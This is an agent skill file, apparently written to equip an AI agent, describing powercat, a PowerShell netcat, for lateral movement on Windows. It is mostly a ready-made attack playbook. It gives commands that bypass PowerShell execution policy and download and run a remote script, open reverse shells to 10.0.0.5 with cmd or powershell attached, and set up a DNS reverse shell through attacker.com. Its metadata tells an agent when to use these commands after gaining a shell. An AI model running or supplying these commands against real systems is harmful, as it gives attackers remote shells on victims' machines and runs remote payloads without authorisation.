---
name: powercat-netcat-ps
description: "Windows-native netcat. Signals: lateral movement, psexec, listening, reverse."
zh-signals: "powercat: Windows 原生 netcat。信号:横向移动,psexec,监听,反弹。"
when-to-use: "Use powercat when you have a Windows shell and need a native PowerShell netcat for listening, reverse shells over TCP/UDP/DNS/SSL, or file transfer during lateral movement."
---

# powercat

- Attack Category: C31 Remote Service Lateral Movement
- Upstream Repository: https://github.com/besimorhino/powercat
- Upstream License: Apache-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/besimorhino/powercat
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `powershell -ep bypass -c 'IEX (New-Object Net.WebClient).DownloadString("http://vps/powercat.ps1"); powercat -l -p 4444 -e cmd'` | Listener |
| `powercat -c 10.0.0.5 -p 4444 -e cmd` | Reverse shell |
| `powercat -l -p 4444 -r dns:attacker.com` | DNS reverse shell |

## Attack Scenario Playbook

### Native Windows netcat

```bash
# Inside an existing shell: IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/powercat.ps1')
powercat -c 10.0.0.5 -p 443 -e powershell
```

## Notes

PowerShell-based netcat supporting TCP/UDP/DNS/SSL reverse connections plus file transfer, delivered as a single file with no installation required.
